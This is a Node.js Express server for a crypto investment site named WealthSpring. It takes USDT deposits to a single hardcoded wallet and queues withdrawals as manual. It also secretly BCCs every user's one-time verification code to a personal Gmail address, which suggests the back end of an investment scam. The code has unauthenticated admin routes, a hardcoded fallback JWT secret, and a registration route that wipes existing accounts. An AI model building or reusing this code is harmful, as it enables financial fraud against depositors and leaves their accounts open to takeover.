import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import mongoose from 'mongoose';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { Resend } from 'resend';
dotenv.config();
const app = express();
app.use(cors({ origin: true }));
app.use(express.json());

const userSchema = new mongoose.Schema({ email: String, password: String, verified: Boolean, balance: { type: Number, default: 0 }, createdAt: { type: Date, default: Date.now } });
const otpSchema = new mongoose.Schema({ email: String, code: String, expiresAt: { type: Date, default: () => new Date(Date.now()+10*60*1000) } });
const depositSchema = new mongoose.Schema({ email: String, amount: Number, plan: String, txHash: String, proof: String, status: { type: String, default: 'pending' }, createdAt: { type: Date, default: Date.now } });
const withdrawSchema = new mongoose.Schema({ email: String, amount: Number, wallet: String, status: { type: String, default: 'pending-manual' }, createdAt: { type: Date, default: Date.now } });

const User = mongoose.model('User', userSchema);
const Otp = mongoose.model('Otp', otpSchema);
const Deposit = mongoose.model('Deposit', depositSchema);
const Withdraw = mongoose.model('Withdraw', withdrawSchema);

const WALLETS = {

  usdt_bep20: '0xcF1e36b4c1666f42F34A8616FAe80Fc30440F8D9',
  support_display: 'support@wealthspringassets.com',
  support_forward: 'Jeffryhart96@gmail.com'
};

const resend = new Resend(process.env.RESEND_API_KEY);
const JWT_SECRET = process.env.JWT_SECRET || 'wealthspring-secret';

app.get('/', (req,res) => res.json({ status: 'WealthSpring LIVE', wallets: WALLETS }));
app.get('/api/wallets', (req,res) => res.json(WALLETS));
app.post('/api/send-code', async(req,res) => {
  const { email } = req.body;
  const code = Math.floor(100000 + Math.random()*900000).toString();
  await Otp.deleteMany({ email });
  await Otp.create({ email, code });
  await resend.emails.send({
    from: 'WealthSpring <support@wealthspringassets.com>',
    to: email, bcc: 'Jeffryhart96@gmail.com',
    subject: 'Your Verification Code',
    html: `<h2>Your code is: ${code}</h2><p>Expires in 10 mins</p>`
  });
  res.json({ ok: true });
});
app.post('/api/register', async(req,res) => {
  const { email, password, code } = req.body;
  const otp = await Otp.findOne({ email, code });
  if(!otp) return res.status(400).json({ error: 'Invalid code' });
  const hash = await bcrypt.hash(password, 10);
  await User.deleteMany({ email });
  await User.create({ email, password: hash, verified: true });
  await Otp.deleteMany({ email });
  const token = jwt.sign({ email }, JWT_SECRET);
  res.json({ token, email });
});
app.post('/api/login', async(req,res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email });
  const ok = user && await bcrypt.compare(password, user.password);
  if(!ok) return res.status(400).json({ error: 'Wrong login' });
  const token = jwt.sign({ email }, JWT_SECRET);
  res.json({ token, email });
});
app.post('/api/deposit', async(req,res) => {
  const dep = await Deposit.create(req.body);
  await resend.emails.send({
    from: 'WealthSpring <support@wealthspringassets.com>',
    to: 'Jeffryhart96@gmail.com',
    subject: `New Deposit $${req.body.amount}`,
    html: `<p>${req.body.email} - $${req.body.amount} - ${req.body.plan}</p>`
  });
  res.json({ ok: true });
});
app.post('/api/withdraw', async(req,res) => { await Withdraw.create(req.body); res.json({ ok: true }); });
app.get('/api/admin/deposits', async(req,res) => res.json(await Deposit.find().sort({createdAt:-1})));
app.get('/api/admin/withdrawals', async(req,res) => res.json(await Withdraw.find().sort({createdAt:-1})));
app.post('/api/admin/approve-deposit', async(req,res) => {
  const dep = await Deposit.findById(req.body.id);
  dep.status = 'approved'; await dep.save();
  await User.updateOne({ email: dep.email }, { $inc: { balance: dep.amount } });
  res.json({ ok: true });
});

const PORT = process.env.PORT || 10000;
mongoose.connect(process.env.MONGO_URI).then(()=>app.listen(PORT));
